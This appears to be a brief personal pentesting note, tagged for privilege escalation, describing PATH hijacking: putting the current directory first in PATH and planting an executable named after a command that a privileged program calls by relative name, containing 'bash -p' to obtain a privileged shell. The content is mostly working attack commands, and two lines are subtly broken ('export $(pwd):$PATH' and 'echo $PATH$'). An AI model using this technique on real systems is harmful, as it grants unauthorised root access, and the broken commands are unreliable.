
It is used when detect some program that is use a command and this not in absolute route, you can change the path putting a first match.

1. Add to the first of the queue the actual route

````bash
export PATH=.:$PATH
````

The point represent the actually directory

or maybe this:

````bash
export $(pwd):$PATH
````

````bash
echo $PATH$
````

2. Create a file **with the name of the command to supply**, inside we put this:
````bash
bash -p
````

> bash -p --> Provides a bash with **privileges**

3. Add **executing permission** to the file created

----

# Tags

#pathhijacking #scaleprivilage

---